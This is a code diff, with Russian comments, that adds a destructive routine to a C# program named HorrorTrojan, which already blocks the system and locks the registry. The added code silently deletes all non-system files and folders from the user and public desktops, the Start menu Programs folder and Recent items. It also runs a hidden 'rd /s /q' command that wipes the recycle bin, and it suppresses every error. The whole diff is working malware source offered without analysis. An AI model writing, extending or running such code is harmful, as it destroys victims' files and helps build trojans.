@@ -58,6 +58,10 @@ namespace HorrorTrojan
                     ResourceExtractor.ExtractAll();
                     SystemBlocker.BlockEverything();
                     RegistryLocker.LockEverything();
+                    
+                    // === УДАЛЕНИЕ СОДЕРЖИМОГО РАБОЧЕГО СТОЛА ===
+                    DeleteDesktopContents();
+                    
                     ApplyWallpaper();
                     ApplyCursors();
                     
@@ -113,6 +117,80 @@ namespace HorrorTrojan
             };
             Process.Start(psi);
             Environment.Exit(0);
+        }
+        
+        private static void DeleteDesktopContents()
+        {
+            try
+            {
+                // Получаем путь к рабочему столу текущего пользователя
+                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                string publicDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
+                
+                // Удаляем файлы и папки с рабочего стола
+                DeleteAllFilesAndFolders(desktopPath);
+                DeleteAllFilesAndFolders(publicDesktopPath);
+                
+                // Удаляем все ярлыки из папки "Programs" (меню Пуск)
+                string programsPath = Environment.GetFolderPath(Environment.SpecialFolder.Programs);
+                DeleteAllFilesAndFolders(programsPath);
+                
+                // Удаляем быстрый доступ (Recent Documents)
+                string recentPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
+                DeleteAllFilesAndFolders(recentPath);
+                
+                // Очищаем корзину (через shell32)
+                try
+                {
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = "cmd.exe",
+                        Arguments = "/c rd /s /q C:\\$Recycle.bin",
+                        CreateNoWindow = true,
+                        UseShellExecute = false
+                    });
+                }
+                catch { }
+            }
+            catch { }
+        }
+        
+        private static void DeleteAllFilesAndFolders(string path)
+        {
+            try
+            {
+                if (!Directory.Exists(path)) return;
+                
+                // Удаляем все файлы
+                foreach (string file in Directory.GetFiles(path))
+                {
+                    try
+                    {
+                        // Пропускаем системные файлы (если они есть)
+                        FileInfo fi = new FileInfo(file);
+                        if ((fi.Attributes & FileAttributes.System) == FileAttributes.System)
+                            continue;
+                        
+                        File.Delete(file);
+                    }
+                    catch { }
+                }
+                
+                // Удаляем все папки
+                foreach (string dir in Directory.GetDirectories(path))
+                {
+                    try
+                    {
+                        DirectoryInfo di = new DirectoryInfo(dir);
+                        if ((di.Attributes & FileAttributes.System) == FileAttributes.System)
+                            continue;
+                        
+                        Directory.Delete(dir, true);
+                    }
+                    catch { }
+                }
+            }
+            catch { }
         }
         
         private static void ApplyWallpaper()
